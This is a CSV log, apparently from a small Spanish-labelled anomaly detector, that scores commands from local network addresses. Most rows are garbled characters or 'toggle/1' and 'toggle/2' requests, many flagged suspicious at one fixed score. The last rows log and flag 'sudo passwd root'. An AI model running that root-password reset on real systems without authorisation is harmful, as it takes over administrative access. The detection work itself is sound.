timestamp,source_ip,raw_cmd,label,score,reason
2025-11-25T03:41:51.548690,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:06.599383,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:21.653454,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:36.697079,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:42:51.757879,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:43:06.807815,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:43:21.863816,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:50:16.992387,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:50:32.037169,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:50:47.091534,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:59:25.642862,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:59:40.689320,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T03:59:55.742714,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:10.795344,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:25.849319,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:40.900833,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:00:55.953967,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:01:11.013396,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:02:41.121152,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:02:56.160651,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:04:51.257092,192.168.18.28,Ѵʭȼ,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:12.963432,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:17.232052,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:19.069776,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:19.587700,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:28.392710,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:29.315633,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:30:40.583597,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:12.432099,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:13.451538,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:14.371995,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:14.985001,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:22.668066,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:23.687328,192.168.18.41,toggle/2,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:31:24.624080,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:06.900640,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:07.839469,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:08.643494,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:09.357596,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:10.116419,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:32:11.100108,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:44.002449,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:44.895459,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:45.716859,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:46.737336,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:47.558069,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:48.276140,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:49.000933,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:33:49.807121,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:38:31.439941,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T04:42:07.932955,192.168.18.41,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T18:47:24.397103,192.168.18.22,toggle/1,sospechoso,0.3384971233715097,modelo cargado
2025-11-25T18:55:20.521134,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:23:54.974541,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:23:56.608633,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:24:55.282747,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:24:56.410891,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-25T19:24:57.012434,192.168.18.22,toggle/1,normal,0.45669215525281515,modelo cargado
2025-11-26T19:16:45.615867,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:16:51.140348,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
2025-11-26T19:16:52.775608,192.168.18.22,sudo passwd root,sospechoso,0.40002286811140286,modelo cargado
